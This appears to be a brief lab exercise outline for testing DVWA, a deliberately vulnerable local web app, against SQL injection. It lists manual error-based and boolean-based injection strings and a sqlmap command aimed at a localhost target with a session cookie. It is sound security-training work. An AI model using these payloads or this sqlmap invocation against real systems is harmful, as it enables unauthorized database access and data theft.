# Experiment 6: Evaluation of Database Security Against SQL Injection Vulnerabilities Using SQLmap

**Aim:** To evaluate database security against Error-Based, Boolean-Based Blind, and Time-Based Blind SQL Injection in DVWA using SQLmap[cite: 13].

## Workflow & Commands
1. **Manual Testing:**
   * Error-Based test input: `1'`
   * Boolean TRUE condition: `1' AND '1'='1`
   * Boolean FALSE condition: `1' AND '1'='2`
2. **Automated Assessment via SQLmap:**
   ```powershell
   python .\sqlmap.py -u "http://localhost:8080/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<session_id>; security=low" --batch
   ```
